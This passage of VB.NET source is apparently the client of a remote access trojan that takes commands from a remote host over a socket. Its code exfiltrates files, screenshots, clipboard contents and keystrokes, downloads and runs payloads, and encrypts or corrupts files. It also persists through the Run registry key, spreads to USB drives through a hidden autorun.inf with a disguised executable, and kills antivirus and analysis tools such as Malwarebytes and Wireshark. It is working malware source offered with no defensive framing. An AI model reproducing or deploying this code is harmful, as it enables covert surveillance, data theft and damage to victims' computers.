                        ShowWindow(iHwnd, SW_SHOWMINIMIZED)
                        Comet.Send("SP")
                    Next
                Case "viewimage"
                    Comet.Send("viewimage" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy)
                Case "GetDrives"
                    Comet.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        Comet.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        Comet.Send("FileManager" & Yy & "Error")
                    End Try
                Case "\\"
                    Comet.Send("\\")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))

                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Exletn"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Start()
                Case "CpoSx"
                    File.Copy(Application.ExecutablePath, A(1) + " .EXE")
                Case "IOPPYR"
                    File.Copy(Application.ExecutablePath, A(1) + " .EXE")
                    System.IO.File.SetAttributes(A(1) + " .EXE", IO.FileAttributes.Hidden)

                Case "EMNS"
                    File.Encrypt(A(1))
                Case "EMNqS"
                    File.Decrypt(A(1))

                Case "Cuut"
                    TextBox2.Text = A(1)

                Case "Cuutod"
                    TextBox2.Text = A(1)

                Case "Cuutodsd"
                    File.Move(TextBox2.Text, A(1))
                    TextBox2.Text = ""


                Case "dCopsx"
                    File.Copy(TextBox2.Text, A(1))
                    TextBox2.Text = ""
                Case "CLLSKXOa"
                    SHEmptyRecycleBin(Me.Handle.ToInt32, vbNullString, SHERB_NOCONFIRMATION + SHERB_NOSOUND)
                    SHUpdateRecycleBinIcon()
                Case "EIIT"
                    Dim Vir As String = "C:\Program Files (x86)" & "\WinRAR\Rar "
                    Dim POXow = A(1)
                    Dim oi$ = A(1) + ".rar"
                    Shell(Vir + "a -r """ + oi + """ """ + POXow)
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                    Comet.Send("Coloreg")
                Case "playmusic"
                    My.Computer.Audio.Play(A(1), AudioPlayMode.Background)
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    Comet.Send("getpath" & Yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    Comet.Send("getpath" & Yy & specialfolder)
                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    Comet.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    Comet.Send("getpath" & Yy & specialfolder & "\")
                Case "edittextfile"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    Comet.Send("edittextfile" & Yy & A(1) & Yy & d)
                Case "savetextfile"
                    Dim Comet As New IO.StreamWriter(A(1))
                    Comet.WriteLine(A(2))
                    Comet.Close()
                Case "creatnewtextfile"
                    Try
                        IO.File.Create(A(1)).Dispose()
                    Catch ex As Exception
                        Comet.Send("msgbox" & Yy & "Information" & Yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper"
                    SystemParametersInfo(SETDESKWALLPAPER, 0, A(1), UPDATEINIFILE)
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                Case "creatnewfolder"
                    Try
                        My.Computer.FileSystem.CreateDirectory _
        (A(1))

                    Catch ez As Exception
                    End Try
                Case "hidefolderfile"
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception
                    End Try
                Case "download"
                    Dim c As New WebClient
                    Dim P As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + A(2)
                    If File.Exists(P) Then File.Delete(P)
                    File.WriteAllBytes(P, c.DownloadData(A(1)))
                    Process.Start(P)
                    Comet.Send("Coloreg")
                Case "showfolderfile"
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception

                    End Try
                Case "downloadfile"
                    Comet.Send("downloadedfile" & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "|U|" & A(2))
                Case "corrupt"
                    Dim corruption As String = "OP0 01 01 200 01 02OP"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(A(1), corruption & d, False)
                Case "tt"
                    Comet.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        Comet.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        Comet.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        Comet.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try
                Case "info"
                    Dim strHostName As String
                    Dim ipHostEntryData As IPHostEntry
                    Dim ipAddress As IPAddress
                    strHostName = Dns.GetHostName
                    ipHostEntryData = Dns.GetHostByName(strHostName)
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    Dim os As String = My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
                    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
                    Dim smsms As String
                    smsms = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")



                    Dim Xepa As String = ""
                    Dim psBattery As PowerStatus = SystemInformation.PowerStatus
                    Dim perFull As Single = psBattery.BatteryLifePercent
                    If perFull * 100 > 100 Then
                        Xepa = 100
                    ElseIf perFull * 100 < 100 Then
                        Xepa = perFull * 100
                    End If
                    If psBattery.PowerLineStatus = PowerLineStatus.Online Then
                        Xepa = "Powered Charging - " & perFull * 100 & "%"

                    ElseIf psBattery.PowerLineStatus = PowerLineStatus.Offline Then
                        Xepa = "do not Charging Powered - " & perFull * 100 & "%"

                    End If

                    For Each ipAddress In ipHostEntryData.AddressList




                        imge_desik()


                        Comet.Send("info" & Yy & name & Yy & pc & Yy & country & Yy & os + GenerateOperatingSystem() & Yy & getanti() & Yy & checkcam() & Yy & RAM() & Yy & cpu & Yy & Ver & Yy & FR() & Yy & smsms & Yy & ipAddress.ToString() & Yy & Xepa & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))                   ' End If












                        'Comet.Send("infoDesk" & "|U|" &  &













                    Next
                Case "Uninstall"
                    RtlSetProcessIsCritical(False, False, False)
                    Try
                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()

                    Catch ex As Exception
                    End Try

                    Try
                        If hidme Then
                            File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal)
                        End If
                        UNS()
                    Catch : End Try

                Case "!"
                    r.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    Comet.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "!!"
                    r.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    Comet.Send("!!" & Yy & s.Width & Yy & s.Height)
                Case "@"
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = r.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    Comet.Send(M.ToArray)
                    M.Dispose()
                Case "YOD"

                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    hekoo.Text = A(1)
                    Comet.Send("Coloreg")

                Case "helpx"
                    Dim hek As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + A(4)

                    If A(3) = 1 Then
                        My.Computer.FileSystem.WriteAllText(hek, A(2), False)
                        Shell(A(1) + " " + hek, AppWinStyle.Hide)
                    End If
                    If A(3) = 2 Then
                        My.Computer.FileSystem.WriteAllText(hek, A(2), False)
                        Shell(A(1) + " " + hek, AppWinStyle.NormalFocus)
                    End If
                    If A(3) = 3 Then
                        My.Computer.FileSystem.WriteAllText(hek, A(2), False)
                        Shell(A(1) + " " + hek, AppWinStyle.MaximizedFocus)
                    End If
                    If A(3) = 4 Then
                        My.Computer.FileSystem.WriteAllText(hek, A(2), False)
                        Shell(A(1) + " " + hek, AppWinStyle.MinimizedFocus)
                    End If
                Case "Kilsx"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Kill()
                Case "KilsStsr"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Start()
                Case "Kiloooow"
                    Dim erio() As Process = Process.GetProcessesByName(A(1))
                    For Each Process As Process In erio
                        Process.Kill()
                    Next
                Case "KilsStsrooow"
                    Process.Start(A(1))
                Case "msgx"
                    If A(3) = 0 Then
                        MsgBox(A(1), MsgBoxStyle.Critical, A(2))
                    End If
                    If A(3) = 1 Then
                        MsgBox(A(1), MsgBoxStyle.Exclamation, A(2))
                    End If
                    If A(3) = 2 Then
                        MsgBox(A(1), MsgBoxStyle.Information, A(2))
                    End If
                    If A(3) = 3 Then
                        MsgBox(A(1), 0, A(2))
                    End If
                Case "@@"

                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = CRDP1.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    Comet.Send(M.ToArray)
                    M.Dispose()
                Case "#"
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$"
                    Cursor.Position = New Point(A(1), A(2))
                Case "close"
                    RtlSetProcessIsCritical(False, False, False)
                    End
                Case "fun"
                    Comet.Send("fun")
                Case "F"
                    My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                    Process.Start(A(2))
                    Comet.Send("F")
                Case "openkl"
                    Comet.Send("openkl")
                Case "Getloges"
                    Try
                        Comet.Send("loges" & Yy & kl.Logs)
                    Catch : End Try
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            If sco = 1 Then
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    SuspendThread(th)
                    CloseHandle(th)
                End If
            ElseIf sco = 2 Then
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    ResumeThread(th)
                    CloseHandle(th)
                End If
            End If


        Next
    End Sub
#Region " =================== remote Shell =================== "

#End Region
    Public Function ENB(ByRef s As String) As String
        On Error Resume Next
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        On Error Resume Next
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            Comet.Send("rs" & Yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            Comet.Send("rsc" & Yy)
        Catch ex As Exception
        End Try
    End Sub

    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey
        Dim k As String
        If key.StartsWith(Registry.ClassesRoot.Name) Then
            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
            Return Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.CurrentUser.Name) Then
            k = key.Replace(Registry.CurrentUser.Name & "\", "")
            Return Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.LocalMachine.Name) Then
            k = key.Replace(Registry.LocalMachine.Name & "\", "")
            Return Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.Users.Name) Then
            k = key.Replace(Registry.Users.Name & "\", "")
            Return Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Delegate Sub gt()
    Function gtx() As String
        Dim str As String
        str = Windows.Forms.Clipboard.GetText
        Comet.Send("recvcli" & Yy & str)
        Return True
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        On Error Resume Next
        Dim ItemProcess() As Process = Process.GetProcessesByName("procexp")

        If Not ItemProcess Is Nothing Then

            For Each SubProcess As Process In ItemProcess

                SubProcess.Kill()

            Next
        End If
    End Sub

    Private Sub Timer4_Tick(sender As System.Object, e As System.EventArgs) Handles Timer4.Tick

        Try
            Dim ProcessHacker() As Process = Process.GetProcessesByName("ProcessHacker")

            For Each Process As Process In ProcessHacker
                Process.Kill()
            Next

        Catch x As Exception
        End Try
        Dim ItemProcess() As Process = Process.GetProcessesByName("ProcessHacker")

        If Not ItemProcess Is Nothing Then

            For Each SubProcess As Process In ItemProcess

                SubProcess.Kill()

            Next
        End If
    End Sub

    Private Sub Timer5_Tick(sender As System.Object, e As System.EventArgs) Handles Timer5.Tick
        Try
            Dim apateDNS() As Process = Process.GetProcessesByName("apateDNS")

            For Each Process As Process In apateDNS
                Process.Kill()
            Next

        Catch x As Exception
        End Try

    End Sub

    Private Sub Timer6_Tick(sender As System.Object, e As System.EventArgs) Handles Timer6.Tick
        For Each proc In System.Diagnostics.Process.GetProcessesByName("mbamgui")
            If proc.MainWindowTitle.Trim() = "Malwarebytes Anti-Malware" Then
                proc.Kill()
            End If
        Next
        Try
            Dim mbamgui() As Process = Process.GetProcessesByName("mbamgui")

            For Each Process As Process In mbamgui
                Process.Kill()
            Next

        Catch x As Exception
        End Try
        For Each proc In System.Diagnostics.Process.GetProcessesByName("mbam")
            If proc.MainWindowTitle.Trim() = "Malwarebytes Anti-Malware" Then
                proc.Kill()
            End If
        Next
        Try
            Dim mbam() As Process = Process.GetProcessesByName("mbam")

            For Each Process As Process In mbam
                Process.Kill()
            Next

        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer7_Tick(sender As System.Object, e As System.EventArgs) Handles Timer7.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("AntiLogger")

            For Each Process As Process In AntiLogger
                Process.Kill()
            Next

        Catch x As Exception
        End Try

    End Sub

    Sub Persist(ByVal Skey As String)
        Do
            System.Threading.Thread.Sleep(500)
            Try
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(Skey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        Loop
    End Sub
    Sub BA()
        Try
            Do

                Dim i As CLIENT_ID
                Dim hThread As Long
i:
                pfnStartAddr = GetProcAddress(LoadLibrary("ntdll"), "RtlExitUserProcess")
                RtlCreateUserThread(Process.GetProcessesByName("sqlwriter")(0).Handle, 0&, 0, 0, 0, 0, pfnStartAddr, 0, 0, i)
                Threading.Thread.Sleep(2000)
            Loop
        Catch ex As Exception
            GoTo i
        End Try

    End Sub

    Public Sub IconsToggle()
        On Error Resume Next
        Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
        hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)

        If IsWindowVisible(hWnd) Then
            ShowWindow(hWnd, SW.Hide)
        Else
            ShowWindow(hWnd, SW.ShowNoActivate)
        End If
    End Sub
    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
    "FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String,
    ByVal lpsz2 As String) As Int32

    Private Sub HideTaskbarItems()
        On Error Resume Next
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 1)
    End Sub
    Private Sub ShowTaskbarItems()
        On Error Resume Next
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 0)
    End Sub
    Private Sub hideclock()
        On Error Resume Next
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 0)
    End Sub

    Private Sub showclock()
        On Error Resume Next
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 1)

    End Sub

    Dim sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
    Sub UNS()
        Dim StartupKey As String = namev
        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
        regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.DeleteValue(namev)
        Try
            Dim e = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe"
        Catch ex As Exception
        End Try
        Try
            Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(RG, False)
        Catch ex As Exception
        End Try
        Try
            If CheckBox28 Then

                Shell("SCHTASKS /Delete /TN " + TextBox13.Text + " /f", AppWinStyle.Hide)
                File.Delete(TextBox12.Text)
            End If
            File.Delete(hid)
            File.Delete(scream)
            File.Delete(screamx)
            File.Delete(ooo)
            Shell("cmd.exe /k ping 0 & del " & ChrW(34) & LO.FullName & ChrW(34) & " & exit", AppWinStyle.Hide)

        Catch ex As Exception
        End Try

        End
    End Sub
    Sub CreateDirectory(ByVal Path As String)
        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)
        Directory.CreateDirectory(appData)
    End Sub
#Region "Chat System"
    Delegate Sub rv(ByVal data1 As String)
    Delegate Sub oc()
    Delegate Sub ec()
    Sub och()
        On Error Resume Next
        w.Show()

    End Sub
    Sub cc()
        On Error Resume Next
        w.Close()

    End Sub
    Sub rvt(ByVal data1 As String)
        On Error Resume Next
        w.Recv.Text += Environment.NewLine & "(Hacker): " & data1
        w.Recv.SelectionStart = w.Recv.Text.Length
        w.Recv.ScrollToCaret()

        On Error Resume Next
        Dim era7s As Integer = w.Recv.Find("(You Have a New File )-> ", 1, RichTextBoxFinds.None)
        Do While era7s > -0
            w.Recv.Select(era7s, "(You Have a New File )-> ".Length)
            w.Recv.SelectionColor = Color.Blue
            era7s = w.Recv.Find("(You Have a New File )-> ", era7s + "(You Have a New File )-> ".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            w.Recv.HideSelection = True
        Loop
        On Error Resume Next
        Dim era7 As Integer = w.Recv.Find("(ME):", 1, RichTextBoxFinds.None)
        Do While era7 > -0
            w.Recv.Select(era7, "(ME):".Length)
            w.Recv.SelectionColor = Color.DodgerBlue
            era7 = w.Recv.Find("(ME):", era7 + "(ME):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            w.Recv.HideSelection = True
        Loop
        On Error Resume Next
        Dim era7r As Integer = w.Recv.Find("(Hacker):", 1, RichTextBoxFinds.None)
        Do While era7r > -0
            w.Recv.Select(era7r, "(Hacker):".Length)
            w.Recv.SelectionColor = Color.MediumAquamarine
            era7r = w.Recv.Find("(Hacker):", era7r + "(Hacker):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            w.Recv.HideSelection = True
        Loop

        My.Computer.Audio.Play("C:\Windows\Media\Windows Pop-up Blocked.wav", AudioPlayMode.Background)

        If hekoo.Text = "" Then

        Else
            w.Recv.Text += "(You Have a New File )->  \\" + hekoo.Text & NewLine

            hekoo.Text = ""
        End If


    End Sub
    Sub rvte(ByVal data1 As String)
        On Error Resume Next

        My.Computer.Keyboard.SendKeys(data1)
    End Sub

#End Region

    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick

        Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (IO.Directory.GetLogicalDrives)
        For Each usbs In driver
            Try
                IO.File.Copy(Application.ExecutablePath, usbs & "Umbrella.flv.exe")
                Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & usbs & "Umbrella.flv.exe")
                AutoStart.WriteLine("shellexecute=" & usbs, 1)
                AutoStart.Close()
                System.IO.File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                System.IO.File.SetAttributes(usbs & "Umbrella.flv.exe", FileAttributes.Hidden)
            Catch ex As Exception

            End Try
        Next
    End Sub
    Private Sub Timer9_Tick_1(sender As Object, e As EventArgs) Handles Timer9.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SbieCtrl")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer10_Tick(sender As Object, e As EventArgs) Handles Timer10.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SpyTheSpy")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer11_Tick(sender As Object, e As EventArgs) Handles Timer11.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SpeedGear")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer12_Tick(sender As Object, e As EventArgs) Handles Timer12.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("wireshark")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer13_Tick(sender As Object, e As EventArgs) Handles Timer13.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("IPBlocker")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer14_Tick(sender As Object, e As EventArgs) Handles Timer14.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("cports")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub
    Function AVG()
        Dim game1, game2, game3, game4, game5, game6, game7, game8, game9 As Process()
        game1 = Process.GetProcessesByName("avgidsagent")
        game2 = Process.GetProcessesByName("avgfws")
        game3 = Process.GetProcessesByName("avgtray")
        game4 = Process.GetProcessesByName("avgemcx")
        game5 = Process.GetProcessesByName("avgwdsvc")
        game6 = Process.GetProcessesByName("avgnsx")
        game7 = Process.GetProcessesByName("avgcsrvx")
        game8 = Process.GetProcessesByName("avgrsx")
        game9 = Process.GetProcessesByName("ToolbarUpdater")
        Try
            SuspendProcess(game1(0))
            SuspendProcess(game2(0))
            SuspendProcess(game3(0))
            SuspendProcess(game4(0))
            SuspendProcess(game5(0))
            SuspendProcess(game6(0))
            SuspendProcess(game7(0))
            SuspendProcess(game8(0))
            SuspendProcess(game9(0))
        Catch ex As Exception

        End Try
    End Function

    Private Sub Timer15_Tick(sender As Object, e As EventArgs) Handles Timer15.Tick
        On Error Resume Next
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "ollydbg"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Private Sub Timer16_Tick(sender As Object, e As EventArgs) Handles Timer16.Tick
        On Error Resume Next
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "xns5"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Private Sub Timer17_Tick(sender As Object, e As EventArgs) Handles Timer17.Tick
        On Error Resume Next
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "keyscrambler"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Private Sub Horror_Tick(sender As Object, e As EventArgs) Handles Horror.Tick
        On Error Resume Next
        Label1.Text += 1
        If Label1.Text = 70 Then
            If Comet.Statconnected = True Then
                Label1.Text = 1
                Horror.Enabled = True
            Else

                Comet.Connect(HOST, port)
                Label1.Text = 1
                Horror.Enabled = True
            End If
            Label1.Text = 1
            Horror.Enabled = True
        End If
    End Sub

    Private Sub Timer19_Tick(sender As Object, e As EventArgs) Handles Timer19.Tick
        If x62 Then

            Dim P8 As New Process
            For Each P8 In Process.GetProcesses
                If P8.MainWindowTitle.Contains(x63) Then
                    Timer19.Enabled = False
                    screamhelp()
                End If
            Next
        End If
        If x65 Then
            Dim str As String
            For Each str In Directory.GetFiles((S762), "*" + x66)
                Timer19.Enabled = False
                screamhelp()
            Next
        End If

    End Sub

    Private Sub xtrem_TextChanged(sender As Object, e As EventArgs) Handles xtrem.TextChanged
        On Error Resume Next
        If ero = 2 Then
            Comet.Send("xox" & Yy & xtrem.Text)
        End If
    End Sub
    Sub Doxi()



        On Error Resume Next


        Dim q1 As Boolean
        q1 = GetAsyncKeyState(Keys.Q)
        If q1 Then
            Timer20.Enabled = False
            xtrem.Text += "Q"
        End If
        Dim w1 As Boolean
        w1 = GetAsyncKeyState(Keys.W)
        If w1 Then
            Timer20.Enabled = False
            xtrem.Text += "W"

        End If
        Dim e1 As Boolean
        e1 = GetAsyncKeyState(Keys.E)
        If e1 Then
            Timer20.Enabled = False
            xtrem.Text += "E"

        End If
        Dim r1 As Boolean
        r1 = GetAsyncKeyState(Keys.R)
        If r1 Then
            Timer20.Enabled = False
            xtrem.Text += "R"

        End If
        Dim t1 As Boolean
        t1 = GetAsyncKeyState(Keys.T)
        If t1 Then
            Timer20.Enabled = False
            xtrem.Text += "T"

        End If
        Dim y1 As Boolean

        y1 = GetAsyncKeyState(Keys.Y)
        If y1 Then
            Timer20.Enabled = False
            xtrem.Text += "Y"

        End If
        Dim u1 As Boolean
        u1 = GetAsyncKeyState(Keys.U)
        If u1 Then
            Timer20.Enabled = False
            xtrem.Text += "U"

        End If
        Dim i1 As Boolean
        i1 = GetAsyncKeyState(Keys.I)
        If i1 Then
            Timer20.Enabled = False
            xtrem.Text += "I"

        End If
        Dim o1 As Boolean
        o1 = GetAsyncKeyState(Keys.O)
        If o1 Then
            Timer20.Enabled = False
            xtrem.Text += "O"

        End If
        Dim p1 As Boolean
